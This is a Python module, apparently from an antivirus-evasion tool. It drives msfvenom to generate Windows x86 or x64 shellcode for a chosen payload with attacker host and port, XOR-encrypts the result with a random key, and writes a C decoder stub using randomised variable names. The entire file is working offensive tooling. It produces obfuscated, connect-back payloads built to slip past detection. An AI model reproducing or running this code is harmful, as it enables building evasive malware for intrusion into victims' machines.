from lib import core
import subprocess
import random
import re


def shellcode_generation(architecture, payload, lhost, lport):
    if architecture == "x86":
        msfvenom = ['msfvenom', '-a', 'x86', '--platform', 'windows', '-p', payload, lhost, lport, '-e', 'x86/xor_dynamic', '--smallest', '-f', 'c']
        shellcode = subprocess.run(msfvenom, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
        core.shellcode_generated()
        vShellcode, decoder_stub = xor_encryption(shellcode)
        core.shellcode_encrypted()
        return vShellcode, decoder_stub

    elif architecture == "x64":
        msfvenom = ['msfvenom', '-a', 'x64', '--platform', 'windows', '-p', payload, lhost, lport, '-e', 'x64/xor_dynamic', '--smallest', '-f', 'c']
        shellcode = subprocess.run(msfvenom, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
        core.shellcode_generated()
        vShellcode, decoder_stub = xor_encryption(shellcode)
        core.shellcode_encrypted()
        return vShellcode, decoder_stub


def xor_encryption(shellcode):

    final_stub = re.findall('\\\\x([a-f0-9][a-f0-9])', shellcode)
    shellcode_len = len(final_stub)
    password = str(random.randint(1000000000, 9999999999))

    vShellcode = core.varname_creator()
    vShellcodelen = core.varname_creator()
    vEshellcode = core.varname_creator()
    vPassword = core.varname_creator()
    vPasswordlen = core.varname_creator()

    #Variables
    final_stub = '\nint enc_shellcode[] = { ' + ', '.join([str(int(code, 16) ^ ord(password[(i % len(password))])) for i, code in enumerate(final_stub)]) + ' };\n'
    final_stub = final_stub.replace("enc_shellcode", vEshellcode)
    final_stub += 'int ' + vShellcodelen + f' = {shellcode_len};\n'
    final_stub += 'char ' + vPassword + f'[] = "{password}";\n'
    final_stub += 'int ' + vPasswordlen + f'= {len(password)};\n'

    #Decoder stub
    final_stub += "unsigned char " + vShellcode + "[" + vShellcodelen + "];\n"
    final_stub += "for(int i = 0; i < " + vShellcodelen + "; i++) {\n"
    final_stub += vShellcode + "[i] = (char) " + vEshellcode + "[i] ^ " + vPassword + "[i % " + vPasswordlen + "];\n}\n"

    return vShellcode, final_stub
